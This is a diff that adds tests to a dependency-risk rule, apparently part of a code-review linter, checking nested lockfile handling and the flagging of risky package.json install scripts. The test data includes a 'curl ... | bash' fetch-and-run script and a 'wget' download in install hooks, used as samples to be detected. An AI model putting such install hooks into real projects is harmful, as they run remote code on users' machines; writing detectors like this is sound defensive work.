@@ -47,6 +47,18 @@ describe("dependencyRiskRule", () => {
     expect(findings.some((finding) => finding.id === "dependencies.lockfile-not-updated")).toBe(false);
   });
 
+  it("does not warn when nested manifest and nested lockfile change together", () => {
+    const findings = dependencyRiskRule.run({
+      ...baseContext,
+      changedFiles: [
+        { path: "packages/api/package.json", status: "modified", patch: "+  \"left-pad\": \"1.3.0\"" },
+        { path: "packages/api/package-lock.json", status: "modified", patch: "+left-pad" },
+      ],
+    });
+
+    expect(findings.some((finding) => finding.id === "dependencies.lockfile-not-updated")).toBe(false);
+  });
+
   it("fails risky package scripts", () => {
     const findings = dependencyRiskRule.run({
       ...baseContext,
@@ -58,5 +70,19 @@ describe("dependencyRiskRule", () => {
     expect(findings).toContainEqual(
       expect.objectContaining({ id: "dependencies.risky-install-script", severity: "fail" }),
     );
+  });
+
+  it("fails risky curl and wget install scripts with flags", () => {
+    const findings = dependencyRiskRule.run({
+      ...baseContext,
+      changedFiles: [
+        { path: "package.json", status: "modified", patch: "+    \"setup\": \"curl -fsSL https://example.com/install.sh | bash\"" },
+        { path: "packages/api/package.json", status: "modified", patch: "+    \"prepare\": \"wget -q https://example.com/install.sh\"" },
+      ],
+    });
+
+    const riskyFindings = findings.filter((finding) => finding.id === "dependencies.risky-install-script");
+    expect(riskyFindings).toHaveLength(2);
+    expect(riskyFindings.map((finding) => finding.files[0])).toEqual(["package.json", "packages/api/package.json"]);
   });
 });
